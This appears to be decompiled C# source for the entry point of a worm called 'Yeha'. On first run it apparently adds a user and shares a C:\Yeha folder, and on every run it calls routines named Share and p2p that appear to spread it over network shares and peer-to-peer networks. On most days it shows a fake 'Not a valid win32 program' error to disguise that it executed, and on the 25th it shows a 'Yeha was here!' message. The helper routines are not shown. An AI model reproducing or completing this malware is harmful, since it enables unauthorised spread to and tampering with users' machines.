using System;
using System.Windows.Forms;

namespace Yeha;

internal class Program
{
	private static void Main(string[] args)
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		Yeha yeha = new Yeha();
		if (!yeha.chkIt())
		{
			yeha.YehaUser();
			yeha.CreateShare("C:\\Yeha", "Yeha");
		}
		yeha.Share();
		yeha.p2p();
		if (DateTime.Now.Day == 25)
		{
			MessageBox.Show("Yeha was here!", "Yeha", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else
		{
			MessageBox.Show("Not a valid win32 program", "Windows", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}
}
